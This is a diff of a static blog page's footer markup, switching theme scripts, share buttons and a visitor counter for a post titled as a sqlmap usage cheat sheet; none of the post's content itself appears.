+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqlmap操作详解(常用备忘录)》 — osword's blog&url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" alt="微信分享二维码">
+</div>
 
 
 
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
 
 
 
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
 
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '#post-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
     });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "sqlmap操作详解(常用备忘录)&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+})();
+</script>
 
 
 
